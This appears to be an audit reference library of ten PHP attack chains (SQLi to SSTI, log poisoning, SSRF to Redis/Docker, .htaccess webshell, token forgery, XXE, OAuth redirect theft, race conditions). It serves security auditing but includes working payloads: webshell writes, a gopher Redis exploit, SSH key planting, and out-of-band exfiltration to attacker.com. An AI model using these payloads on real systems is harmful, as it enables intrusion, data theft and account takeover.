# Attack Chain Pattern Library

> Known multi-step attack chain patterns for identifying cross-vulnerability combination exploitation paths during PHP project security audits.
> Each chain includes a diagram, prerequisites, and per-step sink type mapping.

---

## 1. SQLi -> SSTI Chain (SQL Injection to Server-Side Template Injection)

**Chain Diagram:**

```
A (User Input) → B (SQL Injection) → C (Query Result Rendered in Template) → D (SSTI / RCE)
```

**Prerequisites:**
- Application has a SQL injection point (typically a SELECT query whose results are reflected)
- SQL query results are directly concatenated into a template engine (Twig, Blade, Smarty, etc.) without escaping
- Template engine sandbox mode is not enabled or sandbox is misconfigured

**Step-by-Step Sink Mapping:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | User input enters SQL query | `SQL_INJECTION` |
| B | SQL query returns malicious template syntax | `DATA_FLOW` (intermediate transfer) |
| C | Result concatenated into template string and rendered | `SSTI` |
| D | Template engine executes arbitrary code | `CODE_EXECUTION` |

**Hex Encoding Bypass:**

When WAF or input filters block `{{` `}}`, hex encoding at the SQL layer MAY be used to bypass:

```sql
-- Original payload: {{7*7}} or {{_self.env.registerUndefinedFilterCallback("exec")}}
-- Hex-encoded and stored in the database:
SELECT 0x7b7b372a377d7d;          -- Returns {{7*7}}
SELECT 0x7b7b5f73656c662e656e762e7265676973746572556e646566696e656446696c74657243616c6c6261636b28226578656322297d7d;
-- The database stores raw bytes; once retrieved, the template engine directly parses {{...}}
```

**Detection Pattern:**
- Audit all paths where SQL query results flow into `render()`, `display()`, `Blade::compileString()`
- Watch for encoding functions like `CONCAT()`, `CHAR()`, `0x` used in SELECT statements

---

## 2. LFI -> Log Poisoning -> RCE Chain (Local File Inclusion to Remote Code Execution)

**Chain Diagram:**

```
A (Path Traversal / LFI) → B (Read Log File) → C (User-Agent Inject PHP Code into Log) → D (Include Log File) → E (RCE)
```

**Prerequisites:**
- A local file inclusion vulnerability exists (`include`, `require`, `include_once`, etc. accept user input)
- Web server log paths are predictable (e.g., `/var/log/apache2/access.log`, `/var/log/nginx/access.log`)
- Log files are readable by the PHP process
- `allow_url_include` does not need to be enabled (local files suffice)

**Step-by-Step Sink Mapping:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | Path traversal to read arbitrary files | `PATH_TRAVERSAL` |
| B | Confirm log file is readable | `FILE_READ` |
| C | Send request with PHP code in User-Agent header | `LOG_INJECTION` |
| D | Include log file via LFI | `FILE_INCLUSION` |
| E | PHP engine parses `<?php ?>` tags in the log | `CODE_EXECUTION` |

**Exploit Flow:**

```
# Step 1: Inject malicious User-Agent into log
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# Step 2: Include log file via LFI
http://target.com/index.php?page=../../../var/log/apache2/access.log&cmd=id
```

**Common Log Paths:**
- Apache: `/var/log/apache2/access.log`, `/var/log/httpd/access_log`
- Nginx: `/var/log/nginx/access.log`
- PHP-FPM: `/var/log/php-fpm.log`
- Custom Laravel: `storage/logs/laravel.log`

---

## 3. SSRF -> Internal Service -> RCE Chain (Server-Side Request Forgery to Internal Service Exploitation)

**Chain Diagram:**

```
A (SSRF Entry Point) → B (Access Internal Service) → C (Exploit Internal API) → D (RCE / Data Exfil)
```

**Prerequisites:**
- Application has an SSRF vulnerability (`file_get_contents`, `curl_exec`, `fsockopen`, etc. accept user-controlled URLs)
- Internal network contains unauthenticated sensitive services
- No effective SSRF protection (incomplete IP blocklist, bypassable via DNS rebinding, etc.)

**Step-by-Step Sink Mapping:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | User controls request target URL | `SSRF` |
| B | Request reaches internal service | `NETWORK_ACCESS` |
| C | Exploit internal service API to perform operations | `API_ABUSE` |
| D | Achieve code execution or data exfiltration | `CODE_EXECUTION` / `DATA_LEAK` |

**Target: Docker API (localhost:2375):**

```
# Create malicious container via SSRF
POST http://127.0.0.1:2375/containers/create
{"Image":"alpine","Cmd":["/bin/sh","-c","cat /etc/shadow"],"Binds":["/:/host"]}

# PHP SSRF payload
$url = "http://127.0.0.1:2375/containers/create";
```

**Target: Redis (localhost:6379) - Write Webshell:**

```
# Use gopher protocol via SSRF to operate Redis and write webshell
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<?php eval($_POST[1]);?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**Target: Redis - Write SSH Key:**

```
# Write SSH public key to /root/.ssh/authorized_keys
redis-cli -h 127.0.0.1 CONFIG SET dir /root/.ssh
redis-cli -h 127.0.0.1 CONFIG SET dbfilename authorized_keys
redis-cli -h 127.0.0.1 SET x "\n\nssh-rsa AAAA...your_key...\n\n"
redis-cli -h 127.0.0.1 SAVE
```

**Target: Internal Admin Panels:**
- `http://127.0.0.1:8080/admin` - Internal admin panel without authentication
- `http://192.168.1.0/24` - Internal network scan discovers other services

---

## 4. File Upload -> .htaccess -> Webshell Chain (File Upload to Apache Config Override to Webshell)

**Chain Diagram:**

```
A (Upload .htaccess) → B (Override Apache Parse Rules) → C (Upload Webshell with Allowed Extension) → D (RCE)
```

**Prerequisites:**
- Upload functionality does not restrict `.htaccess` file uploads (or filename detection can be bypassed)
- Apache configuration has `AllowOverride All` or `AllowOverride FileInfo` enabled
- Upload directory is directly accessible via the web
- The web path to the upload directory is known

**Step-by-Step Sink Mapping:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | Upload .htaccess file | `FILE_UPLOAD` |
| B | Apache loads new parsing rules | `CONFIG_OVERRIDE` |
| C | Upload webshell with disguised extension | `FILE_UPLOAD` |
| D | Access webshell to achieve code execution | `CODE_EXECUTION` |

**Malicious .htaccess Content:**

```apache
# Method 1: Parse .jpg files as PHP
AddType application/x-httpd-php .jpg

# Method 2: Parse custom extension as PHP
AddType application/x-httpd-php .abc

# Method 3: Using SetHandler
<FilesMatch "\.png$">
    SetHandler application/x-httpd-php
</FilesMatch>

# Method 4: Modify config with php_value
php_value auto_prepend_file /tmp/evil.php
```

---

## 5. Information Disclosure -> Token Forgery -> Privilege Escalation Chain

**Chain Diagram:**

```
A (Info Leak: .env / phpinfo / debug page) → B (Extract Secret Key / Token) → C (Forge Auth Token) → D (Privilege Escalation)
```

**Prerequisites:**
- Application has an information disclosure point (`.env` file accessible, `phpinfo()` exposed, debug mode enabled)
- Leaked information contains encryption keys, JWT secrets, or other sensitive credentials
- Application relies on these keys for authentication or authorization

**Step-by-Step Sink Mapping:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | Access leaked sensitive configuration | `INFORMATION_DISCLOSURE` |
| B | Extract key/secret | `SECRET_EXTRACTION` |
| C | Use key to forge token | `TOKEN_FORGERY` |
| D | Operate with elevated privileges | `PRIVILEGE_ESCALATION` |

**Scenario A: Laravel .env Leak -> APP_KEY -> Encryption Forgery:**

```
# .env leaks APP_KEY
APP_KEY=base64:wLp2IS3xkVBaGOby9EfPJr/T5IfjRAaXjRD3WNMljJQ=

# Use APP_KEY to forge Laravel encrypted cookie / session
# Can directly perform deserialization attack or forge admin session
php artisan tinker
>>> encrypt(['user_id' => 1, 'role' => 'admin']);
```

**Scenario B: JWT Secret Leak -> Token Forgery:**

```php
// Leaked JWT secret
$secret = "leaked_jwt_secret_from_env";

// Forge admin token
$header = base64url_encode('{"alg":"HS256","typ":"JWT"}');
$payload = base64url_encode('{"sub":"1","role":"admin","exp":9999999999}');
$signature = hash_hmac('sha256', "$header.$payload", $secret, true);
$token = "$header.$payload." . base64url_encode($signature);
```

**Scenario C: phpinfo() -> Session Path -> Session Hijack:**

```
# phpinfo() leaks session.save_path = /var/lib/php/sessions
# Combined with LFI to read other users' session files
# /var/lib/php/sessions/sess_<SESSION_ID>
```

---

## 6. Deserialization -> POP Chain -> RCE (Deserialization to POP Chain to Remote Code Execution)

**Chain Diagram:**

```
A (User-Controlled Serialized Data) → B (unserialize() Trigger) → C (POP Chain Gadgets) → D (Arbitrary Code Execution)
```

**Prerequisites:**
- Application uses `unserialize()` to process user-controllable data (Cookie, Session, cache, API parameters)
- Project dependencies contain exploitable POP gadget classes (Laravel, Symfony, Yii, Guzzle, etc.)
- PHP version and framework version match known gadget chains

**Step-by-Step Sink Mapping:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | Malicious serialized data enters application | `DESERIALIZATION` |
| B | `unserialize()` triggers magic methods | `UNSAFE_DESERIALIZATION` |
| C | Magic methods chain-call to dangerous functions | `POP_CHAIN` |
| D | Final gadget executes system commands | `CODE_EXECUTION` |

**Common PHP Framework Gadget Chains:**

```
Laravel:  PendingBroadcast -> Dispatcher -> call_user_func()
Symfony:  FnStream -> __destruct() -> call_user_func()
Yii:      BatchQueryResult -> __destruct() -> close() -> call_user_func()
Guzzle:   FnStream -> __destruct() -> call_user_func_array()
Monolog:  BufferHandler -> __destruct() -> close() -> flush() -> write() -> system()
```

**Detection Pattern:**
- Search all `unserialize()` calls and trace parameter sources
- Watch for `__destruct`, `__wakeup`, `__toString`, `__call` magic methods
- Use the PHPGGC tool to verify available gadget chains

---

## 7. Second-Order SQLi -> Password Reset -> Account Takeover Chain

**Chain Diagram:**

```
A (Register with Malicious Username) → B (Malicious Data Stored in DB) → C (Password Change Triggers SQLi) → D (Admin Password Overwritten) → E (Account Takeover)
```

**Prerequisites:**
- Registration or profile modification functionality escapes/parameterizes input (write is safe)
- Password change/reset functionality retrieves username from database and directly concatenates it into SQL (read-then-use is unsafe)
- A flawed assumption of "trust already-stored data" exists

**Step-by-Step Sink Mapping:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | Register with username containing SQL payload | `DATA_INPUT` (safe write) |
| B | Malicious data stored in database | `DATA_STORE` |
| C | Password change retrieves username and concatenates into SQL | `SQL_INJECTION` (second-order trigger) |
| D | UPDATE statement modifies admin password | `DATA_MANIPULATION` |
| E | Log in to admin account using new password | `ACCOUNT_TAKEOVER` |

**Exploit Example:**

```php
// Step A: Register with malicious username
$username = "admin'-- ";  // or "admin' OR '1'='1"

// Step C: Password change logic (has second-order SQLi)
$user = get_current_user();  // Retrieves "admin'-- " from DB
$query = "UPDATE users SET password='$new_pass' WHERE username='$user'";
// Actually executes: UPDATE users SET password='hacked' WHERE username='admin'-- '
// Result: admin's password is modified
```

---

## 8. XXE -> SSRF -> Internal Network Reconnaissance Chain (XML External Entity to SSRF to Internal Network Reconnaissance)

**Chain Diagram:**

```
A (XML Input Point) → B (XXE Entity Declaration) → C (External Entity Fetches Internal URL) → D (Internal Service Response Leaked) → E (Further Exploitation)
```

**Prerequisites:**
- Application parses user-submitted XML data (API, file uploads such as XLSX/DOCX/SVG, SOAP endpoints)
- XML parser has not disabled external entities (`libxml_disable_entity_loader` not set; PHP < 8.0 is dangerous by default)
- Internal network contains discoverable services

**Step-by-Step Sink Mapping:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | Submit XML containing DTD | `XML_INJECTION` |
| B | Parser processes external entity declaration | `XXE` |
| C | Entity reference triggers internal HTTP/file request | `SSRF` |
| D | Response data reflected or exfiltrated via OOB | `INFORMATION_DISCLOSURE` |
| E | Use obtained information for further attacks | `LATERAL_MOVEMENT` |

**Payload Examples:**

```xml
<!-- Basic XXE -> Internal network reconnaissance -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<root>&xxe;</root>

<!-- OOB XXE (Blind) -> Out-of-band data exfiltration -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

---

## 9. Open Redirect -> OAuth Token Theft Chain (Open Redirect to OAuth Authorization Code/Token Theft)

**Chain Diagram:**

```
A (Find Open Redirect on Target) → B (Craft OAuth URL with redirect_uri=open_redirect) → C (User Authorizes App) → D (Auth Code/Token Sent to Attacker via Redirect) → E (Account Takeover)
```

**Prerequisites:**
- Target site has an open redirect vulnerability (`header("Location: $user_input")`)
- OAuth configuration has lax `redirect_uri` validation (only checks domain prefix, allows sub-paths)
- Attacker can trick user into clicking a crafted OAuth authorization link

**Step-by-Step Sink Mapping:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | Discover open redirect endpoint | `OPEN_REDIRECT` |
| B | Embed redirect in OAuth redirect_uri | `OAUTH_MISCONFIGURATION` |
| C | User completes authorization flow | `SOCIAL_ENGINEERING` |
| D | Authorization code redirected to attacker | `TOKEN_THEFT` |
| E | Attacker exchanges code for access_token | `ACCOUNT_TAKEOVER` |

**Exploit Example:**

```
# Step A: Open redirect on target
https://target.com/redirect?url=https://attacker.com

# Step B: Craft OAuth authorization URL
https://oauth.provider.com/authorize?
  client_id=TARGET_APP_ID&
  redirect_uri=https://target.com/redirect?url=https://attacker.com/steal&
  response_type=code&
  scope=openid+profile+email

# Step D: After user authorizes, code is redirected to attacker
https://attacker.com/steal?code=AUTHORIZATION_CODE
```

**PHP Detection Pattern:**
- Audit all locations where `header("Location: ...")` contains user input
- Check whether OAuth redirect_uri validation logic uses strict full matching
- Watch for `parse_url()` parsing ambiguity issues

---

## 10. Race Condition -> Double Spend / Privilege Escalation Chain

**Chain Diagram:**

```
A (Identify TOCTOU Vulnerable Endpoint) → B (Send Concurrent Requests) → C (Check Passes for All Requests Before State Update) → D (Multiple Operations Execute on Same Resource) → E (Balance Manipulation / Privilege Escalation)
```

**Prerequisites:**
- Application has a TOCTOU (Time of Check to Time of Use) flaw
- Critical business logic does not use database transactions or locking mechanisms (`SELECT ... FOR UPDATE`, `LOCK IN SHARE MODE`)
- Concurrent requests can arrive within the time window between check and update

**Step-by-Step Sink Mapping:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | Identify "check-then-act" logic | `RACE_CONDITION` |
| B | Send multiple identical requests concurrently | `CONCURRENT_REQUEST` |
| C | All requests pass balance/permission check | `TOCTOU_BYPASS` |
| D | Each request executes a deduction/operation separately | `STATE_MANIPULATION` |
| E | Balance anomaly or privileges granted multiple times | `BUSINESS_LOGIC_BYPASS` |

**Vulnerable PHP Pattern:**

```php
// Double-spend vulnerability example - balance check without locking
function transfer($from, $to, $amount) {
    $balance = DB::select("SELECT balance FROM accounts WHERE id = ?", [$from]);
    // TOCTOU window: between check and update, concurrent requests also pass the check
    if ($balance >= $amount) {
        DB::update("UPDATE accounts SET balance = balance - ? WHERE id = ?", [$amount, $from]);
        DB::update("UPDATE accounts SET balance = balance + ? WHERE id = ?", [$amount, $to]);
    }
}

// Fix: use database transaction + row-level locking
function transfer_safe($from, $to, $amount) {
    DB::transaction(function () use ($from, $to, $amount) {
        $balance = DB::selectOne(
            "SELECT balance FROM accounts WHERE id = ? FOR UPDATE", [$from]
        )->balance;
        if ($balance >= $amount) {
            DB::update("UPDATE accounts SET balance = balance - ? WHERE id = ?", [$amount, $from]);
            DB::update("UPDATE accounts SET balance = balance + ? WHERE id = ?", [$amount, $to]);
        }
    });
}
```

**Exploitation Tool:**

```bash
# Use curl to send concurrent requests to trigger race condition
for i in $(seq 1 20); do
  curl -s -X POST http://target.com/api/transfer \
    -d "to=attacker&amount=1000" \
    -H "Cookie: session=valid_session" &
done
wait
```

---

## Cross-Reference

Chains MAY be combined. During audits, the following cross-chain paths SHOULD be examined:

| Starting Vulnerability | Connectable Chain | Final Impact |
|------------------------|-------------------|--------------|
| SQLi (Chain 1) | -> Info Disclosure (Chain 5) -> Token Forgery | Account Takeover |
| LFI (Chain 2) | -> Read .env (Chain 5) -> Deserialization (Chain 6) | RCE |
| SSRF (Chain 3) | -> Internal Redis -> Write Webshell | RCE |
| File Upload (Chain 4) | -> Upload Malicious Serialized Data (Chain 6) | RCE |
| XXE (Chain 8) | -> SSRF (Chain 3) -> Docker API | RCE |
| Open Redirect (Chain 9) | -> OAuth Token -> Admin Panel -> More Vulnerabilities | Full Control |

> **Audit Principle**: Individual low-severity vulnerabilities MAY reach Critical level when combined. Always evaluate the possibility of chained exploitation.
